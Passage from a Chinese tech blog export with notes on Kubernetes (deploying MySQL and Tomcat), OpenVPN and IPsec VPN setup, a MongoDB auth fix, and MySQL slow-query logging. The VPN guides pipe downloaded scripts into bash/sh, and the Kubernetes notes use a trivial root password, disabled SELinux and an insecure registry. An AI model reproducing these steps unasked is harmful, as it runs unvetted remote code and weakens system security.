Namespace: default Node: 127.0.0.1/127.0.0.1 Start Time: Sat, 03 Mar 2018 09:22:42 +0800 Labels: app=mysql Status: Pending IP: Controllers: ReplicationController/mysql Containers: mysql: Container ID: Image: mysql Image ID: Port: 3306/TCP State: Waiting Reason: ContainerCreating Ready: False Restart Count: 0 Volume Mounts: &lt;none&gt; Environment Variables: MYSQL_ROOT_PASSWORD: 123456 Conditions: Type Status Initialized True Ready False PodScheduled True No volumes. QoS Class: BestEffort Tolerations: &lt;none&gt; Events: FirstSeen LastSeen Count From SubObjectPath Type Reason Message --------- -------- ----- ---- ------------- -------- ------ ------- 8m 8m 1 {default-scheduler } Normal Scheduled Successfully assigned mysql-cvg6c to 127.0.0.1 8m 3m 6 {kubelet 127.0.0.1} Warning FailedSync Error syncing pod, skipping: failed to &quot;StartContainer&quot; for &quot;POD&quot; with ErrImagePull: &quot;image pull failed for registry.access.redhat.com/rhel7/pod-infrastructure:latest, this may be because there are no credentials on this request. details: (open /etc/docker/certs.d/registry.access.redhat.com/redhat-ca.crt: no such file or directory)&quot; 8m 12s 35 {kubelet 127.0.0.1} Warning FailedSync Error syncing pod, skipping: failed to &quot;StartContainer&quot; for &quot;POD&quot; with ImagePullBackOff: &quot;Back-off pulling image \\&quot;registry.access.redhat.com/rhel7/pod-infrastructure:latest\\&quot;&quot;可以看出是镜像下载失败了 Error syncing pod, skipping: failed to &quot;StartContainer&quot; for &quot;POD&quot; with ErrImagePull: &quot;image pull failed for registry.access.redhat.com/rhel7/pod-infrastructure:latest, this may be because there are no credentials on this request. details: (open /etc/docker/certs.d/registry.access.redhat.com/redhat-ca.crt: no such file or directory)&quot;解决办法: yum install *rhsm*因为没有这个文件或目录，这个解决办法，来自这里 然后删除 RC [root@centos ~]# kubectl delete -f mysql-rc.yaml replicationcontroller &quot;mysql&quot; deleted重新创建 [root@centos ~]# kubectl create -f mysql-rc.yaml replicationcontroller &quot;mysql&quot; created [root@centos ~]# kubectl get rc NAME DESIRED CURRENT READY AGE mysql 1 1 0 10s [root@centos ~]# kubectl get pods NAME READY STATUS RESTARTS AGE mysql-7blh0 0/1 ContainerCreating 0 13s mysql-cvg6c 0/1 Terminating 0 21m发现还是不行 [root@centos ~]# kubectl describe pods mysql Name: mysql-j6vpx Namespace: default Node: 127.0.0.1/127.0.0.1 Start Time: Sat, 03 Mar 2018 09:51:30 +0800 Labels: app=mysql Status: Pending IP: Controllers: ReplicationController/mysql Containers: mysql: Container ID: Image: mysql Image ID: Port: 3306/TCP State: Waiting Reason: ContainerCreating Ready: False Restart Count: 0 Volume Mounts: &lt;none&gt; Environment Variables: MYSQL_ROOT_PASSWORD: 123456 Conditions: Type Status Initialized True Ready False PodScheduled True No volumes. QoS Class: BestEffort Tolerations: &lt;none&gt; Events: FirstSeen LastSeen Count From SubObjectPath Type Reason Message --------- -------- ----- ---- ------------- -------- ------ ------- 59m 59m 1 {default-scheduler } Normal Scheduled Successfully assigned mysql-j6vpx to 127.0.0.1 32m 32m 1 {kubelet 127.0.0.1} Warning MissingClusterDNS kubelet does not have ClusterDNS IP configured and cannot create Pod using &quot;ClusterFirst&quot; policy. Falling back to DNSDefault policy. 32m 32m 1 {kubelet 127.0.0.1} spec.containers{mysql} Normal Pulling pulling image &quot;mysql&quot; 1m 1m 1 {kubelet 127.0.0.1} Warning MissingClusterDNS kubelet does not have ClusterDNS IP configured and cannot create Pod using &quot;ClusterFirst&quot; policy. Falling back to DNSDefault policy. 59s 59s 1 {kubelet 127.0.0.1} spec.containers{mysql} Normal Pulling pulling image &quot;mysql&quot;镜像一直在下载，原因是因为gcr.io 被傻逼墙给干了，草他妈的，耽误我折腾一个小时。 解决办法，修改配置文件/etc/sysconfig/docker OPTIONS=&apos;--selinux-enabled=false --registry-mirror=https://olzwzeg2.mirror.aliyuncs.com --insecure-registry gcr.io&apos;这个是我搜到的镜像加速地址，可以使用 然后重启docker systemctl restart docker后再次查看，发现状态是 Running 了。 [root@centos ~]# kubectl get pods NAME READY STATUS RESTARTS AGE mysql-j6vpx 1/1 Running 0 1h然后 在使用 kubectl describe pods mysql 查看 [root@centos ~]# kubectl describe pods mysql Name: mysql-j6vpx Namespace: default Node: 127.0.0.1/127.0.0.1 Start Time: Sat, 03 Mar 2018 09:51:30 +0800 Labels: app=mysql Status: Running IP: 172.17.0.2 Controllers: ReplicationController/mysql Containers: mysql: Container ID: docker://0f1032ef9bd08438996e76c98f7f313b73a07ade76bf6b4b6b5c42de8dcba053 Image: mysql Image ID: docker-pullable://docker.io/mysql@sha256:227d5c3f54ee3a70c075b1c3013e72781564000d34fc8c7ec5ec353c5b7ef7fa Port: 3306/TCP State: Running Started: Sat, 03 Mar 2018 10:51:26 +0800 Ready: True Restart Count: 0 Volume Mounts: &lt;none&gt; Environment Variables: MYSQL_ROOT_PASSWORD: 123456 Conditions: Type Status Initialized True Ready True PodScheduled True No volumes. QoS Class: BestEffort Tolerations: &lt;none&gt; Events: FirstSeen LastSeen Count From SubObjectPath Type Reason Message --------- -------- ----- ---- ------------- -------- ------ ------- 33m 33m 1 {kubelet 127.0.0.1} Warning MissingClusterDNS kubelet does not have ClusterDNS IP configured and cannot create Pod using &quot;ClusterFirst&quot; policy. Falling back to DNSDefault policy. 33m 33m 1 {kubelet 127.0.0.1} spec.containers{mysql} Normal Pulling pulling image &quot;mysql&quot; 2m 2m 1 {kubelet 127.0.0.1} spec.containers{mysql} Normal Pulling pulling image &quot;mysql&quot; 2m 1m 2 {kubelet 127.0.0.1} Warning MissingClusterDNS kubelet does not have ClusterDNS IP configured and cannot create Pod using &quot;ClusterFirst&quot; policy. Falling back to DNSDefault policy. 1m 1m 1 {kubelet 127.0.0.1} spec.containers{mysql} Normal Pulled Successfully pulled image &quot;mysql&quot; 1m 1m 1 {kubelet 127.0.0.1} spec.containers{mysql} Normal Created Created container with docker id 0f1032ef9bd0; Security:[seccomp=unconfined] 1m 1m 1 {kubelet 127.0.0.1} spec.containers{mysql} Normal Started Started container with docker id 0f1032ef9bd0使用docker ps -a 查看 [root@centos ~]# docker ps -a CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES 0f1032ef9bd0 mysql &quot;docker-entrypoint.sh&quot; 6 minutes ago Up 6 minutes k8s_mysql.f6601b53_mysql-j6vpx_default_64fa560c-1e85-11e8-b481-fa163eee21c2_2999ac54 19334c061120 registry.access.redhat.com/rhel7/pod-infrastructure:latest &quot;/usr/bin/pod&quot; 7 minutes ago Up 7 minutes k8s_POD.1d520ba5_mysql-j6vpx_default_64fa560c-1e85-11e8-b481-fa163eee21c2_3a9e5664 f72b01ab8585 registry.access.redhat.com/rhel7/pod-infrastructure:latest &quot;/usr/bin/pod&quot; 38 minutes ago Exited (0) 7 minutes ago k8s_POD.1d520ba5_mysql-j6vpx_default_64fa560c-1e85-11e8-b481-fa163eee21c2_a7bd20de节点状态 节点的状态主要是用来描述处于 Running 的节点。当前可用的有 NodeReachable 和 NodeReady。以后可能会增加其他状态。NodeReachable 表示集群可达。NodeReady 表示 kubelet 返回 Status Ok 并且 HTTP 状态检查健康。 定义 MYSQL Service 配置[root@centos ~]# cat mysql- mysql-rc.yaml mysql-svc.yaml [root@centos ~]# cat mysql-svc.yaml apiVersion: v1 kind: Service #表明是kubernetes Service metadata: name: mysql spec: ports: - port: 3306 selector: app: mysql创建 Service [root@centos ~]# kubectl create -f mysql-svc.yaml service &quot;mysql&quot; created查看刚刚创建的Service [root@centos ~]# kubectl get svc NAME CLUSTER-IP EXTERNAL-IP PORT(S) AGE kubernetes 10.254.0.1 &lt;none&gt; 443/TCP 13h mysql 10.254.248.63 &lt;none&gt; 3306/TCP 1m注意 Mysql 已经被分配了一个 10.254.248.63 的IP,我们可以通过 CLUSTER-IP+PORT的方式访问 [root@centos ~]# telnet 10.254.248.63 3306 Trying 10.254.248.63... Connected to 10.254.248.63. Escape character is &apos;^]&apos;. J 5.7.21[8e-7}H8e;-bigi3mysql_native_password定义 Tomcat RC 配置创建Tomcat，创建一个 RC 文件 myweb-rc.yaml，内容如下 kind: ReplicationController metadata: name: myweb spec: replicas: 5 selector: app: myweb template: metadata: labels: app: myweb spec: containers: - name: myweb image: kubeguide/tomcat-app:v1 ports: -containerPort: 8080 env: #此处如果在未安装域名解析的情况下，会无法将mysql对应的IP解析到env环境变量中，因此先注释掉！ # - name: MYSQL_SERVICE_HOST # value: &apos;mysql&apos; - name: MYSQL_SERVICE_PORT value: &apos;3306&apos; 执行 kubectl create -f myweb-rc.yaml查看 pods [root@centos ~]# kubectl get pods NAME READY STATUS RESTARTS AGE mysql-j6vpx 1/1 Running 0 10h myweb-2bswt 1/1 Running 0 1m myweb-5wq91 1/1 Running 0 1m myweb-67j9n 1/1 Running 0 1m myweb-r74qq 1/1 Running 0 1m myweb-svz49 1/1 Running 0 1m定义 Tomcat Service 配置然后继续创建 myweb-svc.yaml，内容如下 apiVersion: v1 kind: Service metadata: name: myweb spec: type: NodePort ports: - port: 8080 # 容器端口 nodePort: 30001 # 外网映射的端口，可以通过30001 访问容器的8080端口 selector: app: myweb 创建 Service [root@centos ~]# kubectl create -f myweb-svc.yaml service &quot;myweb&quot; created 查看 Service [root@centos ~]# kubectl get services NAME CLUSTER-IP EXTERNAL-IP PORT(S) AGE kubernetes 10.254.0.1 &lt;none&gt; 443/TCP 22h mysql 10.254.248.63 &lt;none&gt; 3306/TCP 9h myweb 10.254.193.35 &lt;nodes&gt; 8080:30001/TCP 32s删除 rc [root@centos ~]# kubectl delete -f myweb-rc.yaml查看 rc [root@centos ~]# kubectl get rc NAME DESIRED CURRENT READY AGE mysql 1 1 1 11h myweb 5 5 0 4s访问，需要防火墙放行 30001 端口","categories":[],"tags":[{"name":"k8s","slug":"k8s","permalink":"https://awen.me/tags/k8s/"}]},{"title":"Kubernetes 入门","slug":"Kubernetes-入门","date":"2018-03-02T13:04:42.000Z","updated":"2021-02-26T06:05:29.253Z","comments":true,"path":"posts/63468.html","link":"","permalink":"https://awen.me/posts/63468.html","excerpt":"说明本文档基于 kubernetes 权威指南，我基于自己的看书理解整理的一份笔记。 为什么叫 k8sKubernetes 简称 k8s，它的名字起源于古希腊，是舵手的意思，其logo如下 它既像一张渔网又像一个罗盘。 kubernetes 是谷歌的开源产品，其实谷歌在很多年前就有个内部的容器管理工具，叫Brog。 外国的东西到了国内就喜欢被起一些奇奇怪怪的名字，比如苹果的系统 finder 到了国内就被叫撑了访达这么奇葩的名字，kubernetes 也是如此，国内都简称他为k8s。所以下面都叫k8s","text":"说明本文档基于 kubernetes 权威指南，我基于自己的看书理解整理的一份笔记。 为什么叫 k8sKubernetes 简称 k8s，它的名字起源于古希腊，是舵手的意思，其logo如下 它既像一张渔网又像一个罗盘。 kubernetes 是谷歌的开源产品，其实谷歌在很多年前就有个内部的容器管理工具，叫Brog。 外国的东西到了国内就喜欢被起一些奇奇怪怪的名字，比如苹果的系统 finder 到了国内就被叫撑了访达这么奇葩的名字，kubernetes 也是如此，国内都简称他为k8s。所以下面都叫k8s 什么是 kuberneteskubernetes 是一个全新的基于容器技术的分布式架构的领先方案。Kunernetes 是一个开放的开发平台，没有限定任何的编程接口。Kubernetes 是一个完备的分布式系统支撑平台。Kubernetes 具有完备的集群管理能力，包括多层次的安全防护和准入机制、多租户应用支撑能力、透明的服务注册和服务发现机制、内建只能负载均衡器、强大的故障发现和自我修复能力、服务滚动升级和在线扩容能力、可扩展的资源调度机制，以及多粒度的资源配额管理能力。同时 Kubernetes 提供了完善的管理工具，这些工具涵盖了包括开发、部署测试、运维监控在内的各个环节。因此 Kubernetes 是一个全新的基于容器技术的分布式解决方案，并且是一个一站式的完备的分布式形同开发和支撑平台。 一个产品通常由多个组成，容器只是供一个应用服务的能力，需要把多个应用编排组合起来才能提供服务。Kubernetes 是自动化编排容器应用的开源平台，这些操作不仅包括部署、调度和节点集群件的扩展，还包括服务发现和配置服务等架构支持的基础能力，此外 Kubernetes 不仅支持 Docker ，还支持 Rocket 等不同的底层容器技术。 Kubernetes 是第一个将“一切皆服务，一切围绕服务运转”作为指导思想的创新型产品。 kubernetes 的基本知识Servicek8s 中，Service （服务） 是分布式集群架构的核心，一个 Service 对象拥有如下特征： 拥有一个指定的名称。 拥有一个虚拟 IP （Cluster IP、Service IP或 VIP）以及端口号 提供了某种远程服务能力 能够被映射到提供这种服务能力的一组容器应用上。 Service 的服务进程都是基于socket的方式对外提供服务的。比如redis、http等服务 Pod容器提供了强大的隔离功能，所以必须要把 Service 提供服务的这组进程放入容器中进行隔离，因此 Kubernetes 设计了 Pod，它是最小的部署单元。为了建立 Service 和Pod 的关系，k8s 首先给每个 Pod 贴上一个标签，比如给 mysql 贴个标签为name=mysql，php 贴个标签 name=php，然后给相应的 Service 定义标签选择器(Label Selector)，比如mysql Service的label 的选择条件为name=mysql，则意味着该Service 要包含所有name=mysql的的pod上。 Pod运行在我们称之为节点（Node）的环境中，这个节点可以是物理机、虚拟机、公有云或私有云上的主机，同城一个节点运行上百个 Pod，其次每个 Pod 运行一个特殊的 pasue 的容器，其他容器则为业务容器，这些业务容器共享 pause 的容器的网络栈和 volume 挂在卷，因此数据通信更加高效，我们可以将一些密切相关的服务进放入一个 Pod中。 并不是每个 Pod 和他里面运行的容器都能被映射到一个 Service 中，只有那些提供服务的一组 Pod 才会被映射到一个服务。 集群k8s 集群划分为一个master节点和一群工作节点（node），其中： Master节点运行一组进程，包括kube-apiserver、kube-controller-manager和kube-scheduler，这些进程实现了集群资源的管理、Pod的调度、弹性伸缩、安全控制、系统监控和纠错管理等功能，并且这些都是自动化的完成的。 Node 作为集群中的工作节点，运行着真正的应用程序，在 node 上 k8s 管理最小的单元 Pod，它运行着 kubelet、kube-proxy 服进程，这些服务进程负责 Pod 的创建、监控、启动、重启和销毁以及实现软件模式的负载均衡。 RC在k8s 集群中，只需要扩容的Service 关联的 Pod 创建一个 Replication Controller （RC) 则该Service 的扩容以至于后来的Service 升级等问题都能完成。 在一个 RC 定义文件中包含 3 个关键信息 目标 Pod 的定义 目标 Pod 需要运行的副本数量 要监控的目标 Pod的标签 在定义好 RC 后，k8s 会通过定 RC 定义中的 label 筛选出对应的 Pod 实例并进行实时的监控其状态和数量。如果实例少于定义的副本数则会根据 RC 定义的 Pod 模板创建新的 Pod，无须人工干预，有了 RC 扩容只需要修改 RC 中的副本数就可以了。","categories":[],"tags":[{"name":"k8s","slug":"k8s","permalink":"https://awen.me/tags/k8s/"}]},{"title":"使用openvpn","slug":"使用openvpn","date":"2018-02-27T12:32:03.000Z","updated":"2021-02-26T06:05:29.310Z","comments":true,"path":"posts/27160.html","link":"","permalink":"https://awen.me/posts/27160.html","excerpt":"","text":"安装wget https://file.awen.me/openvpn/openvpn-install.sh -O openvpn-install.sh &amp;&amp; bash openvpn-install.sh安装过程中需要External IP填写绑定的弹性公网IP，安装完毕后将 /root/ 下的 client.ovpn 下载到本地倒入 OpenVPN 连接软件进行连接即可。","categories":[],"tags":[]},{"title":"使用 Cisco ipsec vpn","slug":"使用-Cisco-ipsec-vpn","date":"2018-02-24T08:23:38.000Z","updated":"2021-02-26T06:05:29.302Z","comments":true,"path":"posts/60356.html","link":"","permalink":"https://awen.me/posts/60356.html","excerpt":"使用 Cisco IPsec VPN背景由于网易云可用区 B 不提供 OpenVPN 的方式连接，因此需要用户自行搭建 VPN 管理内网服务器。 本篇主要讲解如何搭建和使用 Cisco IPsec VPN","text":"使用 Cisco IPsec VPN背景由于网易云可用区 B 不提供 OpenVPN 的方式连接，因此需要用户自行搭建 VPN 管理内网服务器。 本篇主要讲解如何搭建和使用 Cisco IPsec VPN 准备一台服务器1.在可用区 B 创建一台云服务器，这里操作系统使用 Ubuntu 16.04 安装 VPN1.这里我们使用 GitHub 开源的 IPsec VPN Server Auto Setup Scripts 来作为服务端。 默认安装执行 wget https://file.awen.me/openvpn/vpnsetup.sh -O vpnsetup.sh &amp;&amp; sudo sh vpnsetup.sh这种方式安装会生成随机的用户名、密码和 IPsec 预共享密钥 如果使用 CentOS，请将上面的地址换成 https://git.io/vpnsetup-centos。 自定义参数安装wget https://file.awen.me/openvpn/vpnsetup.sh -O vpnsetup.sh &amp;&amp; sudo \\ VPN_IPSEC_PSK=&apos;你的IPsec预共享密钥&apos; \\ VPN_USER=&apos;你的VPN用户名&apos; \\ VPN_PASSWORD=&apos;你的VPN密码&apos; sh vpnsetup.sh安装完毕会显示你的用户名、密码、IPsec预共享密钥。 配置防火墙和安全组1.防火墙开启UDP 500 和 4500 端口 2.安全组放行UDP 500 和4500 端口 连接 VPNmac 连接1.打开网络偏好设置，创建一个VPN连接 填写IP、用户名、密码，然后点击鉴定设置，输入预共享密钥 然后点击连接即可。 当你连接上了 VPN，就可以直接使用ssh连接内网的服务器了。 Windows第三方软件1.需要下载第三方软件 2.安装后打开软件。 3.单击开始菜单 -&gt; 所有程序 -&gt; ShrewSoft VPN Client -&gt; VPN Access Manager单击工具栏中的 Add (+) 按钮。4.在 Host Name or IP Address 字段中输入你的 VPN 服务器 IP。5.单击 Authentication 选项卡，从 Authentication Method 下拉菜单中选择 Mutual PSK + XAuth。6.单击 Credentials 子选项卡，并在 Pre Shared Key 字段中输入你的 VPN IPsec PSK。7.单击 Phase 1 选项卡，从 Exchange Type 下拉菜单中选择 main。8.单击 Phase 2 选项卡，从 HMAC Algorithm 下拉菜单中选择 sha1。9.单击 Save 保存 VPN 连接的详细信息。10.选择新添加的 VPN 连接。单击工具栏中的 Connect 按钮。11.在 Username 字段中输入你的 VPN 用户名。12.在 Password 字段中输入你的 VPN 密码。13.单击 Connect。14.VPN 连接成功后，你会在 VPN Connect 状态窗口中看到 tunnel enabled 字样。单击 “Network” 选项卡，并确认 Established - 1 显示在 “Security Associations” 下面。最后你可以到 这里 检测你的 IP 地址，应该显示为你的 VPN 服务器 IP。 其他设置1.请参考说明 进行连接。 用户配置在默认情况下，将只创建一个用于 VPN 登录的用户账户。如果你需要添加，更改或者删除用户，请阅读本文档。 首先，IPsec PSK (预共享密钥) 保存在文件 /etc/ipsec.secrets 中。如果要更换一个新的 PSK，可以编辑此文件。所有的 VPN 用户将共享同一个 IPsec PSK。 %any %any : PSK &quot;你的IPsec预共享密钥&quot;对于 IPsec/L2TP，VPN 用户账户信息保存在文件 /etc/ppp/chap-secrets。该文件的格式如下： &quot;你的VPN用户名1&quot; l2tpd &quot;你的VPN密码1&quot; * &quot;你的VPN用户名2&quot; l2tpd &quot;你的VPN密码2&quot; * ... ...你可以添加更多用户，每个用户对应文件中的一行。不要 在用户名，密码或 PSK 中使用这些字符：\\ “ ‘ 对于 IPsec/XAuth (“Cisco IPsec”)， VPN 用户账户信息保存在文件 /etc/ipsec.d/passwd。该文件的格式如下： 你的VPN用户名1:你的VPN密码1的加盐哈希值:xauth-psk 你的VPN用户名2:你的VPN密码2的加盐哈希值:xauth-psk ... ...这个文件中的密码以加盐哈希值的形式保存。该步骤可以借助比如 openssl 工具来完成： 以下命令的输出为：你的VPN密码1的加盐哈希值 openssl passwd -1 &apos;你的VPN密码1&apos;最后，如果你更换了新的 PSK，则需要重启服务。对于添加，更改或者删除 VPN 用户，一般不需重启。 service ipsec restart service xl2tpd restart","categories":[],"tags":[]},{"title":"Mongodb AuthenticationFailed 的解决办法","slug":"Mongodb-AuthenticationFailed-的解决办法","date":"2018-02-12T06:23:05.000Z","updated":"2021-02-26T06:05:29.260Z","comments":true,"path":"posts/17518.html","link":"","permalink":"https://awen.me/posts/17518.html","excerpt":"","text":"在MongoDB的日志中发现错误认证失败： 这个失败的原因是因为其认证模式是MONGODB-CR,而MongoDB 3.0开始就默认使用SCRAM-SHA-1。 MongoDB no longer defaults to MONGODB-CR and instead uses SCRAM-SHA-1 as the default authentication mechanism.具体说明参考官网文档 解决办法是升级客户端或连接时指定认证方式为SCRAM-SHA-1。","categories":[],"tags":[]},{"title":"mysql 慢日志","slug":"慢日志","date":"2018-02-09T06:46:59.000Z","updated":"2021-02-26T06:05:29.335Z","comments":true,"path":"posts/28635.html","link":"","permalink":"https://awen.me/posts/28635.html","excerpt":"MySQL的慢查询日志是MySQL提供的一种日志记录，它用来记录在MySQL中响应时间超过阀值的语句，具体指运行时间超过long_query_time值的SQL，则会被记录到慢查询日志中。long_query_time的默认值为10，意思是运行10S以上的语句。默认情况下，Mysql数据库并不启动慢查询日志，需要我们手动来设置这个参数，当然，如果不是调优需要的话，一般不建议启动该参数，因为开启慢查询日志会或多或少带来一定的性能影响。慢查询日志支持将日志记录写入文件，也支持将日志记录写入数据库表。","text":"MySQL的慢查询日志是MySQL提供的一种日志记录，它用来记录在MySQL中响应时间超过阀值的语句，具体指运行时间超过long_query_time值的SQL，则会被记录到慢查询日志中。long_query_time的默认值为10，意思是运行10S以上的语句。默认情况下，Mysql数据库并不启动慢查询日志，需要我们手动来设置这个参数，当然，如果不是调优需要的话，一般不建议启动该参数，因为开启慢查询日志会或多或少带来一定的性能影响。慢查询日志支持将日志记录写入文件，也支持将日志记录写入数据库表。 慢查询日志相关参数MySQL 慢查询的相关参数解释： slow_query_log ：是否开启慢查询日志，1表示开启，0表示关闭。 log-slow-queries ：旧版（5.6以下版本）MySQL数据库慢查询日志存储路径。可以不设置该参数，系统则会默认给一个缺省的文件host_name-slow.log slow-query-log-file：新版（5.6及以上版本）MySQL数据库慢查询日志存储路径。可以不设置该参数，系统则会默认给一个缺省的文件host_name-slow.log long_query_time ：慢查询阈值，当查询时间多于设定的阈值时，记录日志。 log_queries_not_using_indexes：未使用索引的查询也被记录到慢查询日志中（可选项）。 log_output：日志存储方式。log_output=’FILE’表示将日志存入文件，默认值是’FILE’。log_output=’TABLE’表示将日志存入数据库，这样日志信息就会被写入到mysql.slow_log表中。MySQL数据库支持同时两种日志存储方式，配置的时候以逗号隔开即可，如：log_output=’FILE,TABLE’。日志记录到系统的专用日志表中，要比记录到文件耗费更多的系统资源，因此对于需要启用慢查询日志，又需要能够获得更高的系统性能，那么建议优先记录到文件 慢查询日志配置默认情况下slow_query_log的值为OFF，表示慢查询日志是禁用的，可以通过设置slow_query_log的值来开启，如下所示： mysql&gt; show variables like &apos;%slow_query_log%&apos; -&gt; ; +---------------------+-------------------------------+ | Variable_name | Value | +---------------------+-------------------------------+ | slow_query_log | OFF | | slow_query_log_file | /var/lib/mysql/mysql-slow.log | +---------------------+-------------------------------+ 2 rows in set (0.00 sec)开启 mysql&gt; set global slow_query_log=1; Query OK, 0 rows affected (0.00 sec)然后看状态 mysql&gt; show variables like ‘%slow_query_log%’;+———————+——————————-+| Variable_name | Value |+———————+——————————-+| slow_query_log | ON || slow_query_log_file | /var/lib/mysql/mysql-slow.log |+———————+——————————-+2 rows in set (0.00 sec) 使用set global slow_query_log=1开启了慢查询日志只对当前数据库生效，如果MySQL重启后则会失效。如果要永久生效，就必须修改配置文件my.cnf（其它系统变量也是如此）。例如如下所示： [root@mysql ~]# vim /etc/my.cnf slow_query_log=1 slow_query_log_file=/var/lib/mysql/mysql-slow.log那么开启了慢查询日志后，什么样的SQL才会记录到慢查询日志里面呢？ 这个是由参数long_query_time控制，默认情况下long_query_time的值为10秒，可以使用命令修改，也可以在my.cnf参数里面修改。关于运行时间正好等于long_query_time的情况，并不会被记录下来。也就是说，在mysql源码里是判断大于long_query_time，而非大于等于。从MySQL 5.1开始，long_query_time开始以微秒记录SQL语句运行时间，之前仅用秒为单位记录。如果记录到表里面，只会记录整数部分，不会记录微秒部分。 查看long_time 值 mysql&gt; show variables like &apos;%long_query_time%&apos;; +-----------------+-----------+ | Variable_name | Value | +-----------------+-----------+ | long_query_time | 10.000000 | +-----------------+-----------+ 1 row in set (0.00 sec)设置值 mysql&gt; set global long_query_time=5; Query OK, 0 rows affected (0.00 sec) mysql&gt; show variables like &apos;%long_query_time%&apos;; +-----------------+-----------+ | Variable_name | Value | +-----------------+-----------+ | long_query_time | 10.000000 | +-----------------+-----------+ 1 row in set (0.01 sec)如上所示，我修改了变量long_query_time，但是查询变量long_query_time的值还是10，难道没有修改到呢？注意：使用命令 set global long_query_time=5修改后，需要重新连接或新开一个会话才能看到修改值。你用show variables like ‘long_query_time’查看是当前会话的变量值，你也可以不用重新连接会话，而是用show global variables like ‘long_query_time’; 如下所示： mysql&gt; show global variables like &apos;long_query_time&apos;; +-----------------+----------+ | Variable_name | Value | +-----------------+----------+ | long_query_time | 5.000000 | +-----------------+----------+ 1 row in set (0.00 sec)我们设置long_query_time的值为2 mysql&gt; set global long_query_time=2; Query OK, 0 rows affected (0.00 sec) mysql&gt; show global variables like &apos;long_query_time&apos;; +-----------------+----------+ | Variable_name | Value | +-----------------+----------+ | long_query_time | 2.000000 | +-----------------+----------+ 1 row in set (0.00 sec)然后执行一条超时5秒的语句（需要重新连接mysql） [root@mysql ~]# mysql -u root -p Enter password: Welcome to the MySQL monitor. Commands end with ; or \\g. Your MySQL connection id is 4 Server version: 5.7.21-log MySQL Community Server (GPL) Copyright (c) 2000, 2018, Oracle and/or its affiliates. All rights reserved. Oracle is a registered trademark of Oracle Corporation and/or its affiliates. Other names may be trademarks of their respective owners. Type &apos;help;&apos; or &apos;\\h&apos; for help. Type &apos;\\c&apos; to clear the current input statement. mysql&gt; show variables like &apos;long_query_time&apos;; +-----------------+----------+ | Variable_name | Value | +-----------------+----------+ | long_query_time | 2.000000 | +-----------------+----------+ 1 row in set (0.02 sec) mysql&gt; select sleep(5) -&gt; ; +----------+ | sleep(5) | +----------+ | 0 | +----------+ 1 row in set (5.01 sec)然后查看慢日志可以看到类似信息 [root@mysql ~]# cat /var/lib/mysql/mysql-slow.log /usr/sbin/mysqld, Version: 5.7.21 (MySQL Community Server (GPL)). started with: Tcp port: 3306 Unix socket: /var/lib/mysql/mysql.sock Time Id Command Argument /usr/sbin/mysqld, Version: 5.7.21-log (MySQL Community Server (GPL)). started with: Tcp port: 0 Unix socket: /var/lib/mysql/mysql.sock Time Id Command Argument # Time: 2018-02-09T06:59:47.782111Z # User@Host: root[root] @ localhost [] Id: 4 # Query_time: 5.000252 Lock_time: 0.000000 Rows_sent: 1 Rows_examined: 0 SET timestamp=1518159587; select sleep(5);log_output 参数是指定日志的存储方式。log_output=’FILE’表示将日志存入文件，默认值是’FILE’。log_output=’TABLE’表示将日志存入数据库，这样日志信息就会被写入到mysql.slow_log表中。MySQL数据库支持同时两种日志存储方式，配置的时候以逗号隔开即可，如：log_output=’FILE,TABLE’。日志记录到系统的专用日志表中，要比记录到文件耗费更多的系统资源，因此对于需要启用慢查询日志，又需要能够获得更高的系统性能，那么建议优先记录到文件。 mysql&gt; show variables like &apos;%log_output%&apos;; +---------------+-------+ | Variable_name | Value | +---------------+-------+ | log_output | FILE | +---------------+-------+ 1 row in set (0.01 sec)设置为表 mysql&gt; set global log_output=&apos;TABLE&apos;; Query OK, 0 rows affected (0.00 sec) mysql&gt; show variables like &apos;%log_output%&apos;; +---------------+-------+ | Variable_name | Value | +---------------+-------+ | log_output | TABLE | +---------------+-------+ 1 row in set (0.00 sec) mysql&gt; select sleep(5); +----------+ | sleep(5) | +----------+ | 0 | +----------+ 1 row in set (5.00 sec) mysql&gt; select * from mysql.slow_log; +----------------------------+---------------------------+-----------------+-----------------+-----------+---------------+----+----------------+-----------+-----------+-----------------+-----------+ | start_time | user_host | query_time | lock_time | rows_sent | rows_examined | db | last_insert_id | insert_id | server_id | sql_text | thread_id | +----------------------------+---------------------------+-----------------+-----------------+-----------+---------------+----+----------------+-----------+-----------+-----------------+-----------+ | 2018-02-09 15:03:29.640481 | root[root] @ localhost [] | 00:00:05.000218 | 00:00:00.000000 | 1 | 0 | | 0 | 0 | 0 | select sleep(5) | 4 | +----------------------------+---------------------------+-----------------+-----------------+-----------+---------------+----+----------------+-----------+-----------+-----------------+-----------+ 1 row in set (0.00 sec) 系统变量log-queries-not-using-indexes：未使用索引的查询也被记录到慢查询日志中（可选项）。如果调优的话，建议开启这个选项。另外，开启了这个参数，其实使用full index scan的sql也会被记录到慢查询日志。 mysql&gt; show variables like &apos;log_queries_not_using_indexes&apos;; +-------------------------------+-------+ | Variable_name | Value | +-------------------------------+-------+ | log_queries_not_using_indexes | OFF | +-------------------------------+-------+ 1 row in set (0.00 sec) mysql&gt; set global log_queries_not_using_indexes=1; Query OK, 0 rows affected (0.00 sec) mysql&gt; show variables like &apos;log_queries_not_using_indexes&apos;; +-------------------------------+-------+ | Variable_name | Value | +-------------------------------+-------+ | log_queries_not_using_indexes | ON | +-------------------------------+-------+ 1 row in set (0.00 sec) mysql&gt;系统变量log_slow_admin_statements表示是否将慢管理语句例如ANALYZE TABLE和ALTER TABLE等记入慢查询日志 mysql&gt; show variables like &apos;log_slow_admin_statements&apos;; +---------------------------+-------+ | Variable_name | Value | +---------------------------+-------+ | log_slow_admin_statements | OFF | +---------------------------+-------+ 1 row in set (0.00 sec) mysql&gt; mysql&gt; set global log_slow_admin_statements=1; Query OK, 0 rows affected (0.01 sec) mysql&gt; show variables like &apos;log_slow_admin_statements&apos;; +---------------------------+-------+ | Variable_name | Value | +---------------------------+-------+ | log_slow_admin_statements | ON | +---------------------------+-------+ 1 row in set (0.00 sec)查询有多少条慢日志，可以使用系统变量 mysql&gt; show global status like &apos;%slow_queries%&apos;; +---------------+-------+ | Variable_name | Value | +---------------+-------+ | Slow_queries | 2 | +---------------+-------+ 1 row in set (0.01 sec)日志分析工具mysqldumpslow[root@mysql ~]# mysqldumpslow --help Usage: mysqldumpslow [ OPTS... ] [ LOGS... ] Parse and summarize the MySQL slow query log. Options are --verbose verbose --debug debug --help write this text to standard output -v verbose -d debug -s ORDER what to sort by (al, at, ar, c, l, r, t), &apos;at&apos; is default al: average lock time ar: average rows sent at: average query time c: count l: lock time r: rows sent t: query time -r reverse the sort order (largest last 